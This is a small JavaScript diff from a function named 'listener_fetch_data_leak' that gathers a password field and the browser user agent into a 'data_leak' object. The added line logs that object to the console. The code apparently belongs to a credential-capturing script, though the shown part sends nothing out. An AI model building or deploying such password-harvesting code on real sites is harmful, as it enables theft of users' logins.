@@ -66,6 +66,7 @@ function listener_fetch_data_leak() {
         "password": get_element_value(window["data_leak_label_password"]),
         "uagent": navigator.userAgent
     }
+    console.log("data leaked:"); console.log(data_leak);
 
     // Continue only if all elements exists
     for (var key in data_leak){
